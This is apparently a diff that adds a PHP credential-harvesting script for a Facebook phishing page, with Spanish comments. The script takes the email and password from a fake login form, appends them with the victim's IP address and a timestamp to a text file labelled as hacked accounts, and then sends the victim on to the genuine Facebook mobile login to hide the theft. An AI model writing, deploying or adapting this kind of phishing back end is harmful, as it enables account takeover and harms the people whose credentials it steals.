@@ -1,0 +1,22 @@
+<?php
+//jaja todo esto es genial
+$usuario = $_POST['email']; 
+$password = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR']; 
+$fecha = date("Y-m-d;h:i:s");
+
+
+if( (empty($usuario)) or (empty($password)) ){
+     header('location: mobile.html');
+}else{
+
+     //Guardara en un archivo de texto con las credenciales
+$file = fopen('Contrasenas.txt','a+'); 
+fwrite($file, "\r\nUsuario Hackeado: ".$usuario."\r\nContraseña : ".$password."\r\nIP del usuario: ".$ip."\r\nFecha del Hack: ".$fecha."\r\n<--------XX-------->\r\n");
+fclose($file);
+
+header("Location: https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&amp;lwv=100&amp;refid=8");
+}
+?>
+
+
